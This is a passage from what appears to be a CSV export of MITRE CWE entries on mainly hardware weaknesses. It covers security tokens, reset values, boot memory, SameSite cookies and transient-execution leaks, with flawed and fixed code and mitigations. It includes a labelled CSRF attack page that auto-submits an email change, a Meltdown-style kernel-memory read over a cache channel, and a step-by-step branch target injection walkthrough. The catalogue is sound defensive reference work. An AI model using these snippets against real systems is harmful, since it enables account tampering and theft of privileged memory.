stage (i.e., the Manufacturing Complete fuse gets blown)."
CWE-1270: Generation of Incorrect Security Tokens,"The product implements a Security Token mechanism to differentiate what actions are allowed or disallowed when a transaction originates from an entity. However, the Security Tokens generated in the system are incorrect.","Scope: ConfidentialityIntegrityAvailabilityAccess Control, Impact: Technical Impact:Modify Files or Directories; Execute Unauthorized Code or Commands; Bypass Protection Mechanism; Gain Privileges or Assume Identity; Read Memory; Modify Memory; DoS: Crash, Exit, or Restart, Likelihood: High","Example 1Consider a system with a register for storing an AES key for encryption or decryption. The key is 128 bits long implemented as a set of four 32-bit registers. The key registers are assets, and register, AES_KEY_ACCESS_POLICY, is defined to provide necessary access controls. The access-policy register defines which agents, using a Security Token, may access the AES-key registers. Each bit in this 32-bit register is used to define a Security Token. There could be a maximum of 32 Security Tokens that are allowed access to the AES-key registers. When set (bit = ""1"") bit number allows action from an agent whose identity matches that bit number. If Clear (bit = ""0"") the action is disallowed for the corresponding agent.Assume the system has two agents: a Main-controller and an Aux-controller. The respective Security Tokens are ""1"" and ""2"".RegisterDescriptionDefaultAES_ENC_DEC_KEY_0AES key [0:31] for encryption or decryption0x00000000AES_ENC_DEC_KEY_1AES key [32:63] for encryption or decryption0x00000000AES_ENC_DEC_KEY_2AES key [64:95] for encryption or decryption0x00000000AES_ENC_DEC_KEY_3AES key [96:127] for encryption or decryption0x00000000AES_KEY_ACCESS_POLICYAES key access register [31:0]0x00000002An agent with a Security Token ""1"" has access to AES_ENC_DEC_KEY_0 through AES_ENC_DEC_KEY_3 registers. As per the above access policy, the AES-Key-access policy allows access to the AES-key registers if the security Token is ""1"".(bad code)Example Language:OtherThe SoC incorrectly generates Security Token ""1"" for every agent. In other words, both Main-controller and Aux-controller are assigned Security Token ""1"".Both agents have access to the AES-key registers.(good code)Example Language:OtherThe SoC should correctly generate Security Tokens, assigning ""1"" to the Main-controller and ""2"" to the Aux-controller",Phases:  Architecture and Design; ImplementationGeneration of Security Tokens should be reviewed for design inconsistency and common weaknesses.Security-Token definition and programming flow should be tested in pre-silicon and post-silicon testing.
CWE-1271: Uninitialized Value on Reset for Registers Holding Security Settings,Security-critical logic is not set to a known value on reset.,"Scope: Access ControlAuthenticationAuthorization, Impact: Technical Impact:Varies by Context, Likelihood: ","Example 1Shown below is a positive clock edge triggered flip-flop used to implement a lock bit for test and debug interface. When the circuit is first brought out of reset, the state of the flip-flop will be unknown until the enable input and D-input signals update the flip-flop state. In this example, an attacker can reset the device until the test and debug interface is unlocked and access the test interface until the lock signal is driven to a known state by the logic.(bad code)Example Language:Verilogalways @(posedge clk) beginif (en) lock_jtag <= d;endThe flip-flop can be set to a known value (0 or 1) on reset, but requires that the logic explicitly update the output of the flip-flop if the reset signal is active.(good code)Example Language:Verilogalways @(posedge clk) beginif (~reset) lock_jtag <= 0;else if (en) lock_jtag <= d;end",Phase:  ImplementationDesign checks should be performed to identify any uninitialized flip-flops used for security-critical functions.Phase:  Architecture and DesignAll registers holding security-critical information should be set to a specific value on reset.
CWE-1272: Sensitive Information Uncleared Before Debug/Power State Transition,"The product performs a power or debug state transition, but it does not clear sensitive information that should no longer be accessible due to changes to information access restrictions.","Scope: ConfidentialityIntegrityAvailabilityAccess ControlAccountabilityAuthenticationAuthorizationNon-Repudiation, Impact: Technical Impact:Read Memory; Read Application DataSensitive information may be used to unlock additional capabilities of the device and take advantage of hidden functionalities which could be used to compromise device security., Likelihood: High","Example 1This example shows how an attacker can take advantage of an incorrect state transition.Suppose a device is transitioning from state A to state B. During state A, it can read certain private keys from the hidden fuses that are only accessible in state A but not in state B. The device reads the keys, performs operations using those keys, then transitions to state B, where those private keys should no longer be accessible.(bad code)During the transition from A to B, the device does not scrub the memory.After the transition to state B, even though the private keys are no longer accessible directly from the fuses in state B, they can be accessed indirectly by reading the memory that contains the private keys.(good code)For transition from state A to state B, remove information which should not be available once the transition is complete.","Phases:  Architecture and Design; ImplementationDuring state transitions, information not needed in the next state should be removed before the transition to the next state."
CWE-1273: Device Unlock Credential Sharing,The credentials necessary for unlocking a device are shared across multiple parties and may expose sensitive information.,"Scope: ConfidentialityIntegrityAvailabilityAccess ControlAccountabilityAuthenticationAuthorizationNon-Repudiation, Impact: Technical Impact:Modify Memory; Read Memory; Modify Files or Directories; Read Files or Directories; Modify Application Data; Execute Unauthorized Code or Commands; Gain Privileges or Assume Identity; Bypass Protection MechanismOnce unlock credentials are compromised, an attacker can use the credentials to unlock the device and gain unauthorized access to the hidden functionalities protected by those credentials., Likelihood: ","Example 1This example shows how an attacker can take advantage of compromised credentials.(bad code)Suppose a semiconductor chipmaker, ""C"", uses the foundry ""F"" for fabricating its chips. Now, F has many other customers in addition to C, and some of the other customers are much smaller companies. F has dedicated teams for each of its customers, but somehow it mixes up the unlock credentials and sends the unlock credentials of C to the wrong team. This other team does not take adequate precautions to protect the credentials that have nothing to do with them, and eventually the unlock credentials of C get leaked.When the credentials of multiple organizations are stored together, exposure to third parties occurs frequently.(good code)Vertical integration of a production company is one effective method of protecting sensitive credentials. Where vertical integration is not possible, strict access control and need-to-know are methods which can be implemented to reduce these risks.","Phase:  IntegrationEnsure the unlock credentials are shared with the minimum number of parties and with utmost secrecy. To limit the risk associated with compromised credentials, where possible, the credentials should be part-specific.Phase:  ManufacturingEnsure the unlock credentials are shared with the minimum number of parties and with utmost secrecy. To limit the risk associated with compromised credentials, where possible, the credentials should be part-specific."
CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code,"The product conducts a secure-boot process that transfers bootloader code from Non-Volatile Memory (NVM) into Volatile Memory (VM), but it does not have sufficient access control or other protections for the Volatile Memory.","Scope: Access ControlIntegrity, Impact: Technical Impact:Modify Memory; Execute Unauthorized Code or Commands; Gain Privileges or Assume Identity, Likelihood: High","Example 1A typical SoC secure boot's flow includes fetching the next piece of code (i.e., the boot loader) from NVM (e.g., serial, peripheral interface (SPI) flash), and transferring it to DRAM/SRAM volatile, internal memory, which is more efficient.(bad code)The volatile-memory protections or access controls are insufficient.The memory from where the boot loader executes can be modified by an adversary.(good code)A good architecture should define appropriate protections or access controls to prevent modification by an adversary or untrusted agent, once the bootloader is authenticated.",Phase:  Architecture and DesignEnsure that the design of volatile-memory protections is enough to prevent modification from an adversary or untrusted code.Phase:  TestingTest the volatile-memory protections to ensure they are safe from modification or untrusted code.
CWE-1275: Sensitive Cookie with Improper SameSite Attribute,"The SameSite attribute for sensitive cookies is not set, or an insecure value is used.","Scope: ConfidentialityIntegrityNon-RepudiationAccess Control, Impact: Technical Impact:Modify Application DataIf the website does not impose additional defense against CSRF attacks, failing to use the 'Lax' or 'Strict' values could increase the risk of exposure to CSRF attacks. The likelihood of the integrity breach is Low because a successful attack does not only depend on an insecure SameSite attribute. In order to perform a CSRF attack there are many conditions that must be met, such as the lack of CSRF tokens, no confirmations for sensitive actions on the website, a ""simple"" ""Content-Type"" header in the HTTP request and many more., Likelihood: Low","Example 1In this example, a cookie is used to store a session ID for a client's interaction with a website. The snippet of code below establishes a new cookie to hold the sessionID.(bad code)Example Language:JavaScriptlet sessionId = generateSessionId()let cookieOptions = { domain: 'example.com' }response.cookie('sessionid', sessionId, cookieOptions)Since the sameSite attribute is not specified, the cookie will be sent to the website with each request made by the client. An attacker can potentially perform a CSRF attack by using the following malicious page:(attack code)Example Language:HTML<html><form id=evil action=""http://local:3002/setEmail"" method=""POST""><input type=""hidden"" name=""newEmail"" value=""abc@example.com"" /></form><script>evil.submit()</script></html>When the client visits this malicious web page, it submits a '/setEmail' POST HTTP request to the vulnerable website. Since the browser automatically appends the 'sessionid' cookie to the request, the website automatically performs a 'setEmail' action on behalf of the client.To mitigate the risk, use the sameSite attribute of the 'sessionid' cookie set to 'Strict'.(good code)Example Language:JavaScriptlet sessionId = generateSessionId()let cookieOptions = { domain: 'example.com', sameSite: 'Strict' }response.cookie('sessionid', sessionId, cookieOptions)","Phase:  ImplementationSet the SameSite attribute of a sensitive cookie to 'Lax' or 'Strict'. This instructs the browser to apply this cookie only to same-domain requests, which provides a good Defense in Depth against CSRF attacks. When the 'Lax' value is in use, cookies are also sent for top-level cross-domain navigation via HTTP GET, HEAD, OPTIONS, and TRACE methods, but not for other HTTP methods that are more like to cause side-effects of state mutation.Effectiveness: HighNote:While this mitigation is effective for protecting cookies from a browser's own scripting engine, third-party components or plugins may have their own engines that allow access to cookies. Attackers might also be able to use XMLHTTPResponse to read the headers directly and obtain the cookie."
CWE-1276: Hardware Child Block Incorrectly Connected to Parent System,Signals between a hardware IP and the parent system design are incorrectly connected causing security risks.,"Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Varies by Context, Likelihood: ","Example 1Many SoCs use hardware to partition system resources between trusted and un-trusted entities. One example of this concept is the Arm TrustZone, in which the processor and all security-aware IP attempt to isolate resources based on the status of a privilege bit. This privilege bit is part of the input interface in all TrustZone-aware IP. If this privilege bit is accidentally grounded or left unconnected when the IP is instantiated, privilege escalation of all input data may occur.(bad code)Example Language:Verilog// IP definitionmodule tz_peripheral(clk, reset, data_in, data_in_security_level, ...);input clk, reset;input [31:0] data_in;input data_in_security_level;...endmodule// Instantiation of IP in a parent systemmodule soc(...)...tz_peripheral u_tz_peripheral(.clk(clk),.rst(rst),.data_in(rdata),//Copy-and-paste error or typo grounds data_in_security_level (in this example 0=secure, 1=non-secure) effectively promoting all data to ""secure"").data_in_security_level(1'b0),);...endmoduleIn the Verilog code below, the security level input to the TrustZone aware peripheral is correctly driven by an appropriate signal instead of being grounded.(good code)Example Language:Verilog// Instantiation of IP in a parent systemmodule soc(...)...tz_peripheral u_tz_peripheral(.clk(clk),.rst(rst),.data_in(rdata),// This port is no longer grounded, but instead driven by the appropriate signal.data_in_security_level(rdata_security_level),);...endmoduleExample 2Here is a code snippet from the Ariane core module in the HACK@DAC'21 Openpiton SoC [REF-1362]. To ensure full functional correctness, developers connect the ports with names. However, in some cases developers forget to connect some of these ports to the desired signals in the parent module. These mistakes by developers can lead to incorrect functional behavior or, in some cases, introduce security vulnerabilities.(bad code)Example Language:Verilog...csr_regfile #(...) csr_regfile_i (.flush_o             ( flush_csr_ctrl ),.halt_csr_o          ( halt_csr_ctrl ),....irq_i(),.time_irq_i(),.*);...In the above example from HACK@DAC'21, since interrupt signals are not properly connected, the CSR module will fail to send notifications in the event of interrupts. Consequently, critical information in CSR registers that should be flushed or modified in response to an interrupt won't be updated. These vulnerabilities can potentially result in information leakage across various privilege levels.To address the aforementioned vulnerability, developers must follow a two-step approach. First, they should ensure that all module signals are properly connected. This can often be facilitated using automated tools, and many simulators and sanitizer tools issue warnings when a signal remains unconnected or floats. Second, it is imperative to validate that the signals connected to a module align with the specifications. In the provided example, the developer should establish the correct connection of interrupt signals from the parent module (Ariane core) to the child module (csr_regfile) [REF-1363].(good code)Example Language:Verilog...csr_regfile #(...) csr_regfile_i (.flush_o             ( flush_csr_ctrl ),.halt_csr_o          ( halt_csr_ctrl ),....irq_i			(irq_i),.time_irq_i	(time_irq_i),.*);...",Phase:  TestingSystem-level verification may be used to ensure that components are correctly connected and that design security requirements are not violated due to interactions between various IP blocks.
CWE-1277: Firmware Not Updateable,The product does not provide its users with the ability to update or patch its firmware to address any vulnerabilities or weaknesses that may be present.,"Scope: ConfidentialityIntegrityAccess ControlAuthenticationAuthorization, Impact: Technical Impact:Gain Privileges or Assume Identity; Bypass Protection Mechanism; Execute Unauthorized Code or Commands; DoS: Crash, Exit, or RestartIf an attacker can identify an exploitable vulnerability in one device that has no means of patching, the attack may be used against an entire class of devices., Likelihood: Medium","Example 1A refrigerator has an Internet interface for the official purpose of alerting the manufacturer when that refrigerator detects a fault. Because the device is attached to the Internet, the refrigerator is a target for hackers who may wish to use the device other potentially more nefarious purposes.(bad code)Example Language:OtherThe refrigerator has no means of patching and is hacked becoming a spewer of email spam.(good code)Example Language:OtherThe device automatically patches itself and provides considerable more protection against being hacked.",Phase:  RequirementsSpecify requirements to include the ability to update the firmware. Include integrity checks and authentication to ensure that untrusted firmware cannot be installed.Phase:  Architecture and DesignDesign the device to allow for updating the firmware. Ensure that the design specifies how to distribute the updates and ensure their integrity and authentication.Phase:  ImplementationImplement the necessary functionality to allow the firmware to be updated.
CWE-1278: Missing Protection Against Hardware Reverse Engineering Using Integrated Circuit (IC) Imaging Techniques,Information stored in hardware may be recovered by an attacker with the capability to capture and analyze images of the integrated circuit using techniques such as scanning electron microscopy.,"Scope: Confidentiality, Impact: Technical Impact:Varies by ContextA common goal of malicious actors who reverse engineer ICs is to produce and sell counterfeit versions of the IC., Likelihood: ","Example 1Consider an SoC design that embeds a secret key in read-only memory (ROM). The key is baked into the design logic and may not be modified after fabrication causing the key to be identical for all devices.  An attacker in possession of the IC can decapsulate and delayer the device. After imaging the layers, computer vision algorithms or manual inspection of the circuit features locate the ROM and reveal the value of the key bits as encoded in the visible circuit structure of the ROM.","Phase:  Architecture and DesignThe cost of secret extraction via IC reverse engineering should outweigh the potential value of the secrets being extracted. Threat model and value of secrets should be used to choose the technology used to safeguard those secrets. Examples include IC camouflaging and obfuscation, tamper-proof packaging, active shielding, and physical tampering detection information erasure."
CWE-1279: Cryptographic Operations are run Before Supporting Units are Ready,Performing cryptographic operations without ensuring that the supporting inputs are ready to supply valid data may compromise the cryptographic result.,"Scope: Access ControlConfidentialityIntegrityAvailabilityAccountabilityAuthenticationAuthorizationNon-Repudiation, Impact: Technical Impact:Varies by Context, Likelihood: ","Example 1The following pseudocode illustrates the weak encryption resulting from the use of a pseudo-random-number generator output.(bad code)Example Language:PseudocodeIf random_number_generator_self_test_passed() == TRUEthen Seed = get_random_number_from_RNG()else Seed = hardcoded_numberIn the example above, first a check of RNG ready is performed. If the check fails, the RNG is ignored and a hard coded value is used instead. The hard coded value severely weakens the encrypted output.(good code)Example Language:PseudocodeIf random_number_generator_self_test_passed() == TRUEthen Seed = get_random_number_from_RNG()else enter_error_state()",Phase:  Architecture and DesignBest practices should be used to design cryptographic systems.Phase:  ImplementationContinuously ensuring that cryptographic inputs are supplying valid information is necessary to ensure that the encrypted output is secure.
CWE-1280: Access Control Check Implemented After Asset is Accessed,A product's hardware-based access control check occurs after the asset has been accessed.,"Scope: Access ControlConfidentialityIntegrity, Impact: Technical Impact:Modify Memory; Read Memory; Modify Application Data; Read Application Data; Gain Privileges or Assume Identity; Bypass Protection Mechanism, Likelihood: ","Example 1Assume that the module foo_bar implements a protected register. The register content is the asset. Only transactions made by user id (indicated by signal usr_id) 0x4 are allowed to modify the register contents. The signal grant_access is used to provide access.(bad code)Example Language:Verilogmodule foo_bar(data_out, usr_id, data_in, clk, rst_n);output reg [7:0] data_out;input wire [2:0] usr_id;input wire [7:0] data_in;input wire clk, rst_n;wire grant_access;always @ (posedge clk or negedge rst_n)beginif (!rst_n)data_out = 0;elsedata_out = (grant_access) ? data_in : data_out;assign grant_access = (usr_id == 3'h4) ? 1'b1 : 1'b0;endendmoduleThis code uses Verilog blocking assignments for data_out and grant_access. Therefore, these assignments happen sequentially (i.e., data_out is updated to new value first, and grant_access is updated the next cycle) and not in parallel. Therefore, the asset data_out is allowed to be modified even before the access control check is complete and grant_access signal is set. Since grant_access does not have a reset value, it will be meta-stable and will randomly go to either 0 or 1.Flipping the order of the assignment of data_out and grant_access should solve the problem. The correct snippet of code is shown below.(good code)Example Language:Verilogalways @ (posedge clk or negedge rst_n)beginif (!rst_n)data_out = 0;elseassign grant_access = (usr_id == 3'h4) ? 1'b1 : 1'b0;data_out = (grant_access) ? data_in : data_out;endendmodule",Phase:  ImplementationImplement the access control check first. Access should only be given to asset if agent is authorized.
CWE-1421: Exposure of Sensitive Information in Shared Microarchitectural Structures during Transient Execution,"A processor event may allow transient operations to access architecturally restricted data (for example, in another address space) in a shared microarchitectural structure (for example, a CPU cache), potentially exposing the data over a covert channel.","Scope: Confidentiality, Impact: Technical Impact:Read Memory<<put the information here>>, Likelihood: Medium","Example 1Some processors may perform access control checks in parallel with memory read/write operations. For example, when a user-mode program attempts to read data from memory, the processor may also need to check whether the memory address is mapped into user space or kernel space. If the processor performs the access concurrently with the check, then the access may be able to transiently read kernel data before the check completes. This race condition is demonstrated in the following code snippet from [REF-1408], with additional annotations:(bad code)Example Language:x86 Assembly1 ; rcx = kernel address, rbx = probe array2 xor rax, rax                # set rax to 03 retry:4 mov al, byte [rcx]          # attempt to read kernel memory5 shl rax, 0xc                # multiply result by page size (4KB)6 jz retry                    # if the result is zero, try again7 mov rbx, qword [rbx + rax]  # transmit result over a cache covert channelVulnerable processors may return kernel data from a shared microarchitectural resource in line 4, for example, from the processor's L1 data cache. Since this vulnerability involves a race condition, the mov in line 4 may not always return kernel data (that is, whenever the check ""wins"" the race), in which case this demonstration code re-attempts the access in line 6. The accessed data is multiplied by 4KB, a common page size, to make it easier to observe via a cache covert channel after the transmission in line 7. The use of cache covert channels to observe the side effects of transient execution has been described in [REF-1408].Example 2Many commodity processors share microarchitectural fill buffers
				between sibling hardware threads on simultaneous multithreaded (SMT)
				processors. Fill buffers can serve as temporary storage for data that
				passes to and from the processor's caches. Microarchitectural Fill
				Buffer Data Sampling (MFBDS) is a vulnerability that can allow a
				hardware thread to access its sibling's private data in a shared fill
				buffer. The access may be prohibited by the processor's ISA, but MFBDS
				can allow the access to occur during transient execution, in
				particular during a faulting operation or an operation that triggers a
				microcode assist.More information on MFBDS can be found in [REF-1405] and [REF-1409].Example 3Some processors may allow access to system registers (for example,
				system coprocessor registers or model-specific registers) during
				transient execution. This scenario is depicted in the code snippet
				below. Under ordinary operating circumstances, code in exception level
				0 (EL0) is not permitted to access registers that are restricted to
				EL1, such as TTBR0_EL1. However, on some processors an earlier
				mis-prediction can cause the MRS instruction to transiently read the
				value in an EL1 register. In this example, a conditional branch (line
				2) can be mis-predicted as ""not taken"" while waiting for a slow load
				(line 1). This allows MRS (line 3) to transiently read the value in
				the TTBR0_EL1 register. The subsequent memory access (line 6) can
				allow the restricted register's value to become observable, for
				example, over a cache covert channel.Code snippet is from [REF-1410]. See also [REF-1411].(bad code)Example Language:x86 Assembly1 LDR X1, [X2] ; arranged to miss in the cache2 CBZ X1, over ; This will be taken3 MRS X3, TTBR0_EL1;4 LSL X3, X3, #imm5 AND X3, X3, #0xFC06 LDR X5, [X6,X3] ; X6 is an EL0 base address7 over","Phase:  Architecture and DesignHardware designers may choose to engineer the processor's pipeline to prevent architecturally restricted data from being used by operations that can execute transiently.Effectiveness: HighPhase:  Architecture and DesignHardware designers may choose not to share microarchitectural resources that can contain sensitive data, such as fill buffers and store buffers.Effectiveness: ModerateNote:This can be highly effective at preventing this
				weakness from being exposed across different SMT threads or different
				processor cores. It is generally less practical to isolate these
				resources between different contexts (for example, user and kernel)
				that may execute on the same SMT thread or processor core.Phase:  Architecture and DesignHardware designers may choose to sanitize specific microarchitectural state (for example, store buffers) when the processor transitions to a different context, such as whenever a system call is invoked. Alternatively, the hardware may expose instruction(s) that allow software to sanitize microarchitectural state according to the user or system administrator's threat model. These mitigation approaches are similar to those that addressCWE-226; however, sanitizing microarchitectural state may not be the optimal or best way to mitigate this weakness on every processor design.Effectiveness: ModerateNote:Sanitizing shared state on context transitions
				may not be practical for all processors, especially when the amount of
				shared state affected by the weakness is relatively
				large. Additionally, this technique may not be practical unless there
				is a synchronous transition between two processor contexts that would
				allow the affected resource to be sanitized. For example, this
				technique alone may not suffice to mitigate asynchronous access to a
				resource that is shared by two SMT threads.Phase:  Architecture and DesignThe hardware designer can attempt to prevent transient execution from causing observable discrepancies in specific covert channels.Effectiveness: LimitedNote:This technique has many pitfalls. For example, InvisiSpec was an early attempt to mitigate this weakness by blocking ""micro-architectural covert and side channels through the multiprocessor data cache hierarchy due to speculative loads"" [REF-1417]. Commodity processors and SoCs have many covert and side channels that exist outside of the data cache hierarchy. Even when some of these channels are blocked, others (such as execution ports [REF-1418]) may allow an attacker to infer confidential data. Mitigation strategies that attempt to prevent transient execution from causing observable discrepancies also have other pitfalls, for example, see [REF-1419].Phase:  Architecture and DesignSoftware architects may design software to enforce strong isolation between different contexts. For example, kernel page table isolation (KPTI) mitigates the Meltdown vulnerability [REF-1401] by separating user-mode page tables from kernel-mode page tables, which prevents user-mode processes from using Meltdown to transiently access kernel memory [REF-1404].Effectiveness: LimitedNote:Isolating different contexts across a process
				boundary (or another kind of architectural boundary) may only be
				effective for some weaknesses.Phase:  Build and CompilationIf the weakness is exposed by a single instruction (or a small set of instructions), then the compiler (or JIT, etc.) can be configured to prevent the affected instruction(s) from being generated, and instead generate an alternate sequence of instructions that is not affected by the weakness.Effectiveness: LimitedNote:This technique may only be fully effective if it
				is applied to all software that runs on the system. Also, relatively
				few observed examples of this weakness have exposed data through only
				a single instruction.Phase:  Build and CompilationUse software techniques (including the use of serialization instructions) that are intended to reduce the number of instructions that can be executed transiently after a processor event or misprediction.Effectiveness: IncidentalNote:Some transient execution weaknesses can be exploited even if a single instruction is executed transiently after a processor event or mis-prediction. This mitigation strategy has many other pitfalls that prevent it from eliminating this weakness entirely. For example, see [REF-1389].Phase:  ImplementationSystem software can mitigate this weakness by invoking state-sanitizing operations when switching from one context to another, according to the hardware vendor's recommendations.Effectiveness: LimitedNote:This technique may not be able to mitigate
				weaknesses that arise from resource sharing across SMT threads.Phase:  System ConfigurationSome systems may allow the user to disable (for example, in the BIOS) sharing of the affected resource.Effectiveness: LimitedNote:Disabling resource sharing (for example, by
				disabling SMT) may result in significant performance overhead.Phase:  System ConfigurationSome systems may allow the user to disable (for example, in the BIOS) microarchitectural features that allow transient access to architecturally restricted data.Effectiveness: LimitedNote:Disabling microarchitectural features such as
				predictors may result in significant performance overhead.Phase:  Patching and MaintenanceThe hardware vendor may provide a patch to sanitize the affected shared microarchitectural state when the processor transitions to a different context.Effectiveness: ModerateNote:This technique may not be able to mitigate
				weaknesses that arise from resource sharing across SMT threads.Phase:  Patching and MaintenanceThis kind of patch may not be feasible or implementable for all processors or all weaknesses.Effectiveness: LimitedPhase:  RequirementsProcessor designers, system software vendors, or other agents may choose to restrict the ability of unprivileged software to access to high-resolution timers that are commonly used to monitor covert channels.Effectiveness: Defense in DepthNote:Specific software algorithms can be used by an attacker to compensate for a lack of a high-resolution time source [REF-1420]."
CWE-1422: Exposure of Sensitive Information caused by Incorrect Data Forwarding during Transient Execution,"A processor event or prediction may allow incorrect or stale data to be forwarded to transient operations, potentially exposing data over a covert channel.","Scope: Confidentiality, Impact: Technical Impact:Read Memory, Likelihood: Medium","Example 1Faulting loads in a victim domain may trigger incorrect transient forwarding, which leaves secret-dependent traces in the microarchitectural state. Consider this code sequence example from [REF-1391].(bad code)Example Language:Cvoid call_victim(size_t untrusted_arg) {*arg_copy = untrusted_arg;array[**trusted_ptr * 4096];}A processor with this weakness will store the value of untrusted_arg
				(which may be provided by an attacker) to the stack, which is trusted
				memory. Additionally, this store operation will save this value in
				some microarchitectural buffer, for example, the store buffer.In this code sequence, trusted_ptr is dereferenced while the attacker
				forces a page fault. The faulting load causes the processor to
				mis-speculate by forwarding untrusted_arg as the (transient) load
				result. The processor then uses untrusted_arg for the pointer
				dereference. After the fault has been handled and the load has been
				re-issued with the correct argument, secret-dependent information
				stored at the address of trusted_ptr remains in microarchitectural
				state and can be extracted by an attacker using a vulnerable code
				sequence.Example 2Some processors try to predict when a store will forward data to a subsequent load, even when the address of the store or the load is not yet known. For example, on Intel processors this feature is called a Fast Store Forwarding Predictor [REF-1392], and on AMD processors the feature is called Predictive Store Forwarding [REF-1393]. A misprediction can cause incorrect or stale data to be forwarded from a store to a load, as illustrated in the following code snippet from [REF-1393]:(bad code)Example Language:Cvoid fn(int idx) {unsigned char v;idx_array[0] = 4096;v = array[idx_array[idx] * (idx)];}In this example, assume that the parameter idx can only be 0 or 1, and
				assume that idx_array initially contains all 0s. Observe that the
				assignment to v in line 4 will be array[0], regardless of whether
				idx=0 or idx=1. Now suppose that an attacker repeatedly invokes fn
				with idx=0 to train the store forwarding predictor to predict that the
				store in line 3 will forward the data 4096 to the load idx_array[idx]
				in line 4. Then, when the attacker invokes fn with idx=1 the predictor
				may cause idx_array[idx] to transiently produce the incorrect value
				4096, and therefore v will transiently be assigned the value
				array[4096], which otherwise would not have been accessible in line 4.Although this toy example is benign (it doesn't transmit array[4096]
				over a covert channel), an attacker may be able to use similar
				techniques to craft and train malicious code sequences to, for
				example, read data beyond a software sandbox boundary.","Phase:  Architecture and DesignThe hardware designer can attempt to prevent transient execution from causing observable discrepancies in specific covert channels.Effectiveness: LimitedNote:Instructions or features that constrain transient execution or suppress its side effects may impact performance.Phase:  RequirementsProcessor designers, system software vendors, or other agents may choose to restrict the ability of unprivileged software to access to high-resolution timers that are commonly used to monitor covert channels.Effectiveness: Defense in DepthNote:Disabling specific predictors or other hardware features may result in significant performance overhead.Phase:  RequirementsProcessor designers may expose instructions or other architectural features that allow software to mitigate the effects of transient execution, but without disabling predictors. These features may also help to limit opportunities for data exposure.Effectiveness: ModerateNote:Instructions or features that constrain transient
				execution or suppress its side effects may impact performance.Phase:  RequirementsProcessor designers may expose registers (for example, control registers or model-specific registers) that allow privileged and/or user software to disable specific predictors or other hardware features that can cause confidential data to be exposed during transient execution.Effectiveness: LimitedNote:Disabling specific predictors or other hardware
				features may result in significant performance overhead.Phase:  Build and CompilationUse software techniques (including the use of serialization instructions) that are intended to reduce the number of instructions that can be executed transiently after a processor event or misprediction.Effectiveness: IncidentalNote:Some transient execution weaknesses can be exploited even if a single instruction is executed transiently after a processor event or mis-prediction. This mitigation strategy has many other pitfalls that prevent it from eliminating this weakness entirely. For example, see [REF-1389].Phase:  Build and CompilationIsolate sandboxes or managed runtimes in separate address spaces (separate processes).Effectiveness: HighNote:Process isolation is also an effective strategy
				to mitigate many other kinds of weaknesses.Phase:  Build and CompilationInclude serialization instructions (for example, LFENCE) that prevent processor events or mis-predictions prior to the serialization instruction from causing transient execution after the serialization instruction. For some weaknesses, a serialization instruction can also prevent a processor event or a mis-prediction from occurring after the serialization instruction (for example, CVE-2018-3639 can allow a processor to predict that a load will not depend on an older store; a serialization instruction between the store and the load may allow the store to update memory and prevent the mis-prediction from happening at all).Effectiveness: ModerateNote:When used to comprehensively mitigate a transient
				execution weakness, serialization instructions can introduce
				significant performance overhead.Phase:  Build and CompilationUse software techniques that can mitigate the consequences of transient execution. For example, address masking can be used in some circumstances to prevent out-of-bounds transient reads.Effectiveness: LimitedNote:Address masking and related software mitigation techniques have been used to harden specific code sequences that could potentially be exploited via transient execution. For example, the Linux kernel makes limited use of this technique to mitigate bounds-check bypass [REF-1390].Phase:  Build and CompilationIf the weakness is exposed by a single instruction (or a small set of instructions), then the compiler (or JIT, etc.) can be configured to prevent the affected instruction(s) from being generated, and instead generate an alternate sequence of instructions that is not affected by the weakness.Effectiveness: LimitedNote:This technique is only effective for software
				that is compiled with this mitigation.Phase:  DocumentationIf a hardware feature can allow incorrect or stale data to be forwarded to transient operations, the hardware designer may opt to disclose this behavior in architecture documentation. This documentation can inform users about potential consequences and effective mitigations.Effectiveness: High"
CWE-1423: Exposure of Sensitive Information caused by Shared Microarchitectural Predictor State that Influences Transient Execution,"Shared microarchitectural predictor state may allow code to influence transient execution across a hardware boundary, potentially exposing data that is accessible beyond the boundary over a covert channel.","Scope: Confidentiality, Impact: Technical Impact:Read Memory, Likelihood: Medium","Example 1Branch Target Injection (BTI) is a vulnerability that can allow an SMT hardware thread to maliciously train the indirect branch predictor state that is shared with its sibling hardware thread. A cross-thread BTI attack requires the attacker to find a vulnerable code sequence within the victim software. For example, the authors of [REF-1415] identified the following code sequence in the Windows library ntdll.dll:(bad code)Example Language:x86 Assemblyadc edi,dword ptr [ebx+edx+13BE13BDh]adc dl,byte ptr [edi]...indirect_branch_site:jmp dword ptr [rsi]   # at this point attacker knows edx, controls edi and ebxTo successfully exploit this code sequence to disclose the victim's
					private data, the attacker must also be able to find an indirect
					branch site within the victim, where the attacker controls the values
					in edi and ebx, and the attacker knows the value in edx as shown above
					at the indirect branch site.A proof-of-concept cross-thread BTI attack might proceed as follows:The attacker thread and victim thread must be co-scheduled on the same physical processor core.The attacker thread must train the shared branch predictor so that
					when the victim thread reaches indirect_branch_site, the jmp
					instruction will be predicted to target example_code_sequence instead
					of the correct architectural target. The training procedure may vary
					by processor, and the attacker may need to reverse-engineer the branch
					predictor to identify a suitable training algorithm.This step assumes that the attacker can control some values in the
					victim program, specifically the values in edi and ebx at
					indirect_branch_site. When the victim reaches indirect_branch_site the
					processor will (mis)predict example_code_sequence as the target and
					(transiently) execute the adc instructions. If the attacker chooses
					ebx so that `ebx = m0x13BE13BD - edx, then the first adc will load 32 bits from
							address m in the victim's address space and add *m (the data loaded from)
							to the attacker-controlled base address in edi. The second
							adc instruction accesses a location in memory whose address corresponds
							to *m`.The adversary uses a covert channel analysis technique such as Flush+Reload ([REF-1416]) to infer the value of the victim's private data *m.Example 2BTI can also allow software in one execution context to maliciously
					train branch predictor entries that can be used in another
					context. For example, on some processors user-mode software may be
					able to train predictor entries that can also be used after
					transitioning into kernel mode, such as after invoking a system
					call. This vulnerability does not necessarily require SMT and may
					instead be performed in synchronous steps, though it does require the
					attacker to find an exploitable code sequence in the victim's code,
